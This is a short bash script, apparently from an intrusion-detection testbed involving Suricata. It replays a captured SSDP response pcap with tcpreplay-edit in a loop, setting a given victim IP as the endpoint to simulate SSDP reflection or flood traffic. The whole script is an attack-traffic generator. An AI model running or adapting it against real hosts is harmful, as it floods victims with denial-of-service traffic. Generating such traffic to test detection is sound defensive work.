#!/bin/bash

VICTIM="$1" # Victim IP address
LOOPS="$2"

source ../attack_spec.sh

tcpprep -c 10.0.1.24 -o ssdp.cach -i ssdp-response-short.pcap

while [ $LOOPS -gt 0 ]
do
    IP=$(echo $((RANDOM%254 + 1)))
    tcpreplay-edit --endpoints="$VICTIM":"192.168.122.$IP" \
        --enet-dmac=$__ATTACKER_MAC_ADDR,$__SURICATA_MAC_ADDR \
        --enet-smac=$__SURICATA_MAC_ADDR,$__ATTACKER_MAC_ADDR \
        -t -K -i eth0 -I eth0 \
        -c ssdp.cach ssdp-response-short.pcap

    LOOPS=$(( $LOOPS - 1 ))
done
